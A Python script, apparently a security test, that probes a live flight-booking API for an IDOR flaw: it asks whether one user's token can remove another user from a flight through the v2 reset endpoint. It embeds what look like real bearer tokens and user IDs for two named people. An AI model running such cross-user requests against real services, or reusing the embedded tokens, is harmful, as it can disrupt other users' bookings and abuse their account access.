#!/usr/bin/env python3
"""
IDOR Vulnerability Testing - Can User A affect User B's flights?

This is the MOST CRITICAL security test.
Tests if Ashley can remove Sameer from a flight using v2/reset
"""

import requests
import json
import time
from datetime import datetime

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

SAMEER_ID = 20254
ASHLEY_ID = 171208

def get_current_flights(token):
    """Get current flights for a user"""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{API_URL}/v2/flight/current", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        print(f"Error: {e}")
    return []

def join_flight_v2(token, flight_id):
    """Join flight using v2 API"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post(
            f"{API_URL}/v2/flight/{flight_id}/enter",
            headers=headers,
            json={},
            timeout=10
        )
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def reset_flight_v2(token, flight_id):
    """Leave flight using v2 API"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    try:
        r = requests.post(
            f"{API_URL}/v2/flight/{flight_id}/reset",
            headers=headers,
            json={},
            timeout=10
        )
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def get_available_flights_v3(token):
    """Get available flights from v3 API"""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(
            f"{API_URL}/v3/flight?includeExpired=false&nearMe=false",
            headers=headers,
            timeout=10
        )
        if r.status_code == 200:
            response = r.json()
            if isinstance(response, dict) and 'data' in response:
                return response['data']
            return response
    except Exception as e:
        print(f"Error: {e}")
    return []

def is_on_flight(token, flight_id):
    """Check if user is on a specific flight"""
    flights = get_current_flights(token)
    return any(f.get('id') == flight_id for f in flights)

def main():
    print("="*80)
    print("CRITICAL IDOR VULNERABILITY TEST - V2 API")
    print("="*80)
    print()
    print("Question: Can User A remove User B from a flight?")
    print()
    print("Users:")
    print(f"  User A (Ashley): ID {ASHLEY_ID}")
    print(f"  User B (Sameer): ID {SAMEER_ID}")
    print()
    print("="*80)
    print()

    # Get available flights
    print("Step 1: Finding an available flight...")
    available_flights = get_available_flights_v3(SAMEER_TOKEN)

    if not available_flights:
        print("❌ No available flights to test with")
        return

    test_flight = available_flights[0]
    flight_id = test_flight.get('id')

    print(f"✅ Using Flight {flight_id}")
    print(f"   Route: {test_flight.get('departAirport', {}).get('code', 'N/A')} → {test_flight.get('arriveAirport', {}).get('code', 'N/A')}")
    print(f"   Status: {test_flight.get('status')}")
    print()

    # Check initial states
    print("Step 2: Checking initial states...")
    sameer_on_flight = is_on_flight(SAMEER_TOKEN, flight_id)
    ashley_on_flight = is_on_flight(ASHLEY_TOKEN, flight_id)

    print(f"   Sameer on flight: {sameer_on_flight}")
    print(f"   Ashley on flight: {ashley_on_flight}")
    print()

    # Ensure Sameer is on the flight
    if not sameer_on_flight:
        print("Step 3: Sameer joining flight...")
        status, response = join_flight_v2(SAMEER_TOKEN, flight_id)

        if status == 200:
            print(f"✅ Sameer successfully joined flight {flight_id}")
        else:
            print(f"❌ Sameer failed to join: Status {status}")
            print(f"   Response: {response[:200]}")
            return

        time.sleep(1)

        # Verify
        if not is_on_flight(SAMEER_TOKEN, flight_id):
            print("❌ Verification failed: Sameer not showing on flight")
            return

        print("✅ Verified: Sameer is on the flight")
    else:
        print("Step 3: Skipped (Sameer already on flight)")

    print()

    # Now the critical test: Can Ashley remove Sameer?
    print("="*80)
    print("CRITICAL TEST: Can Ashley remove Sameer from flight?")
    print("="*80)
    print()

    print("Step 4: Ashley attempting to reset Sameer's flight...")
    print(f"   Endpoint: POST /v2/flight/{flight_id}/reset")
    print(f"   Token: Ashley's token")
    print(f"   Expected: Only removes Ashley (if she's on it), NOT Sameer")
    print()

    status, response = reset_flight_v2(ASHLEY_TOKEN, flight_id)

    print(f"   Ashley's request status: {status}")
    print(f"   Response preview: {response[:200]}")
    print()

    time.sleep(1)

    # Check if Sameer is still on flight
    print("Step 5: Verifying Sameer's status...")
    sameer_still_on = is_on_flight(SAMEER_TOKEN, flight_id)
    ashley_still_on = is_on_flight(ASHLEY_TOKEN, flight_id)

    print(f"   Sameer on flight: {sameer_still_on}")
    print(f"   Ashley on flight: {ashley_still_on}")
    print()

    print("="*80)
    print("IDOR VULNERABILITY TEST RESULT")
    print("="*80)
    print()

    if sameer_still_on:
        print("✅ TEST PASSED - NO IDOR VULNERABILITY")
        print()
        print("Findings:")
        print("  ✅ Sameer remains on the flight")
        print("  ✅ Ashley's reset request did not affect Sameer")
        print("  ✅ API properly validates user ownership")
        print("  ✅ No cross-user manipulation possible")
        print()
        print("Security Status: SECURE")
        print("Risk Level: NONE")
    else:
        print("🚨 TEST FAILED - CRITICAL IDOR VULNERABILITY FOUND!")
        print()
        print("Findings:")
        print("  ❌ Sameer was REMOVED from the flight")
        print("  ❌ Ashley successfully manipulated Sameer's flight")
        print("  ❌ API does NOT properly validate user ownership")
        print("  ❌ Cross-user manipulation IS POSSIBLE")
        print()
        print("Security Status: VULNERABLE")
        print("Risk Level: CRITICAL")
        print()
        print("Impact:")
        print("  - Any user can remove any other user from flights")
        print("  - Malicious users can disrupt waitlist positions")
        print("  - Winners can be removed from confirmed flights")
        print("  - Denial of service attack possible")

    print()
    print("="*80)
    print("ADDITIONAL TESTS")
    print("="*80)
    print()

    # Test 2: Can Ashley join Sameer to a flight?
    # (This should fail with 401 or similar, but worth checking)
    if not sameer_still_on:
        print("Test 2: Can Ashley re-add Sameer to the flight?")
        status, response = join_flight_v2(ASHLEY_TOKEN, flight_id)
        print(f"   Status: {status}")
        print(f"   Response: {response[:100]}")

        if status == 200:
            # Check if it added Ashley or Sameer
            sameer_on = is_on_flight(SAMEER_TOKEN, flight_id)
            ashley_on = is_on_flight(ASHLEY_TOKEN, flight_id)
            print(f"   Sameer on flight: {sameer_on}")
            print(f"   Ashley on flight: {ashley_on}")

            if ashley_on:
                print("   ℹ️  Request added Ashley, not Sameer (expected)")
            if sameer_on:
                print("   🚨 Request added SAMEER! Another IDOR vulnerability!")
        print()

    # Cleanup
    print("="*80)
    print("CLEANUP")
    print("="*80)
    print()

    if is_on_flight(SAMEER_TOKEN, flight_id):
        print("Removing Sameer from flight...")
        reset_flight_v2(SAMEER_TOKEN, flight_id)
        print("✅ Cleanup complete")
    else:
        print("ℹ️  No cleanup needed")

    print()
    print("="*80)
    print("TEST COMPLETE")
    print("="*80)

if __name__ == "__main__":
    main()
